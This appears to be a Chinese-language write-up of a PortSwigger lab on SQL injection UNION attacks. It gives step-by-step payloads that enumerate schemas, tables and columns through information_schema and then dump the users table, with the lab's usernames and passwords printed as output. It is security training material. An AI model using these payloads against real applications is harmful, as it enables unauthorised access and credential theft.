https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

先用 https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text 的方法找出有字串的欄位

```
' UNION SELECT NULL, NULL -- abc 		success
' UNION SELECT 'cat', NULL -- abc		success
' UNION SELECT 'cat', 'meow' -- abc		success
```

利用 information schema 找 database, table, column，最後找到資料

## 找 database
```
' UNION SELECT schema_name, NULL FROM information_schema.schemata -- abc
```
public
information_schema
pg_catalog

## 找 table
```
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' -- abc
```
products
users

## 找 column
```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = 'public' and table_name = 'users' -- abc
```
password
username
## 找 data
```
' UNION SELECT username, password FROM public.users -- abc
```
administrator
	al33qc8rbajqg8t0wylj
wiener
	aawd12yibtwky2mlxum6
carlos
	8cvq4q3brje3ze4sp8hm
